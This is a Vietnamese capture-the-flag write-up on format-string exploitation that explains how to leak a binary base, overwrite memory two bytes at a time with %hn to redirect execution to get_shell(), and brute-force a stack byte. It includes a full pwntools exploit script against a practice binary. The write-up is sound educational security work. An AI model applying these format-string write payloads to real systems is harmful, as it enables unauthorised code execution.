<img width="1646" height="270" alt="Screenshot 2026-11-23 222917" src="https://github.com/user-attachments/assets/22429494-d59d-4972-b504-f59abc247a35" />

- Để ghi đè địa chỉ get_shell() vào thì mình cần ghi đè 2 byte mỗi lần (tránh lỗi và ghi quá lâu với 6 byte 1 lần), mình sẽ đưa vào dictionary, mỗi lần lấy 2 byte mình sẽ dịch thêm 16 bit để lấy 2 byte kế tiếp

<img width="780" height="251" alt="Screenshot 2026-11-24 142715" src="https://github.com/user-attachments/assets/2b554429-d373-4f36-8d1f-c58f9a9bdcbd" />
 
- Sau đó mình cộnh thêm offset từ base tới vùng rw- mình muốn ghi vào. Và mình cũng cần cộng thêm 2 byte và 4 byte ở 2 lần ghi kế để nó ghi tới 2 byte sau của địa chỉ (nếu ko cộng nó sẽ ghi cả 3 lần đều vào 2 byte đầu của địa chỉ)

<img width="857" height="667" alt="Screenshot 2026-11-24 152704" src="https://github.com/user-attachments/assets/de3d088d-4d40-4566-9098-279c2351f344" />


<img width="1030" height="701" alt="Screenshot 2026-11-24 152638" src="https://github.com/user-attachments/assets/b7ddd57d-d0fe-4773-95f8-538dcdbe7a3e" />
<img width="382" height="66" alt="Screenshot 2026-11-24 152810" src="https://github.com/user-attachments/assets/84b54506-1d98-49e3-a061-d52af85cc908" />
- Làm 1 phép toán thì mình có thể tính được là cần thay đổi địa chỉ base là bao nhiêu. Và mình biết là mình cần ghi đè 2 byte cuối của base.
- Mà trên Stack có sẵn con trỏ trỏ tới địa chỉ base rồi, mình sẽ tính offset tới con trỏ đó và ghi đè, đến khi kết thúc, chương trình sẽ láy địa chỉ base đó(đã bị thay đổi) rồi cộng offset(0x3d90) rồi nhảy tới get_shell

### Final Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./fmtstr8_patched",checksec=False)
libc = ELF("./libc-2.31.so",checksec=False)
ld = ELF("./ld-2.31.so",checksec=False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p, gdbscript='''
            b*main+141
            c
            ''')
else:
    p = remote("127.0.0.1", 9997)


#.fini_array offset: 0x3d90
############################
### Stage 1: Leak Binary ###
############################

p.sendlineafter(b'something: ', b'%23$p')
p.recvuntil(b'You said: ')
binary_leak = int(p.recvline(), 16)
log.info("Binary Leak: " + hex(binary_leak))
exe.address = binary_leak - exe.sym['main']
#exe.address = binary_leak - 0x1267
log.info("Exe Base Address: " + hex(exe.address))
p.sendlineafter(b'> ', b'n')
########################################
### Stage 2: Write get_shell address ###
########################################
# offset rw- section 0x40f0
# 0x1122 3344 5566
package = {
    (exe.sym['get_shell'] >> 0) & 0xffff: exe.address + 0x40f0,
    (exe.sym['get_shell'] >> 16) & 0xffff: exe.address + 0x40f0 + 2,
    (exe.sym['get_shell'] >> 32) & 0xffff: exe.address + 0x40f0 + 4,


}
order = sorted(package)
print(hex(exe.sym['get_shell']))
print(package)
print(order)

payload = f'%{order[0]}c%13$hn'.encode()
payload += f'%{order[1] - order[0]}c%14$hn'.encode()
payload += f'%{order[2] - order[1]}c%15$hn'.encode()
payload = payload.ljust(64 - 24, b'P')
payload += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]],
    )

p.sendlineafter(b'something: ', payload)
p.sendlineafter(b'> ', b'n')
####################################
### Stage 3: Change base address ###
####################################

p.sendlineafter(b'something: ', f'%{(exe.address + 0x360) & 0xffff}c%38$hn'.encode())
p.sendlineafter(b'> ', b'n')

p.interactive()
```

## FMTSTR 9 - Dùng con trỏ Stack có sẵn để thay đổi dữ liệu

- Trong bài này, phần buffer mà mình dùng để nhập Format String không còn nằm trên Stack nữa

<img width="597" height="610" alt="Screenshot 2026-11-24 160934" src="https://github.com/user-attachments/assets/401d8160-a8eb-4116-8c3d-ed5918af698d" />
<img width="371" height="85" alt="Screenshot 2026-11-24 180334" src="https://github.com/user-attachments/assets/f5952e56-b9bc-4b7a-ac4a-8d566137b731" />

- Chỉ có 1 lần Format String. Mà mình thấy có hàm get_shell() có thể khai thác được

<img width="1552" height="803" alt="Screenshot 2026-11-24 182011" src="https://github.com/user-attachments/assets/8f54ad92-80a0-4792-af02-bffa85a341f1" />

- Mình dừng tại printf() mà xảy ra Format String, mình thấy là chuỗi mình vừa nhập vào không còn được nằm trên Stack nữa mà đang nằm trên Heap -> Đồng nghĩa với việc Format String mình nhập vào sẽ thay đổi dữ liệu trên Heap chứ không còn thay đổi dữ liệu trên Stack 

- Để có thể thay đổi được địa chỉ đó, mình cần dùng 1 địa chỉ Stack có sẵn đang nằm trên Stack

<img width="1632" height="512" alt="Screenshot 2026-11-24 185108" src="https://github.com/user-attachments/assets/13fead24-8ee9-4e99-9f0e-f388c4a5cc5e" />


- Ý tưởng lúc này là mình sẽ ghi đè địa chỉ get_shell() vào saved-rip của hàm play(). Nhưng mình lại không có địa chỉ nào trỏ tới saved-rip của play(). Nên mình sẽ sử dụng 1 địa chỉ Stack đang trỏ tới 1 địa chỉ khác trên Stack.
- Ví dụ mình %n vào 0x7fffffffde80, thì dữ liệu là 0x7fffffffde90 (địa chỉ Stack) sẽ bị thay đổi. 

<img width="1421" height="512" alt="Screenshot 2026-11-24 234441" src="https://github.com/user-attachments/assets/1679bd6c-986f-4e5c-852c-30d21bddb0b5" />

<img width="1412" height="457" alt="Screenshot 2026-11-24 234453" src="https://github.com/user-attachments/assets/87264375-b725-486f-9af7-9b4fa6805aec" />

<img width="1643" height="782" alt="Screenshot 2026-11-24 232926" src="https://github.com/user-attachments/assets/ebdd7d53-4959-44df-9169-761ee753a0d2" />

- Nhưng vì địa chỉ Stack là random nên mình phải brute-force, mà địa chỉ Stack chỗ saved-rbp và saved-rip của play() chit khác nhau 1 byte cuối, nên mình sẽ brute-force 1 byte. Mình sẽ chọn byte 0x68 để brute-force, chạy lại cho tới khi nào gặp địa chỉ Stack chỗ saved-rip play() là đuôi 0x68. 

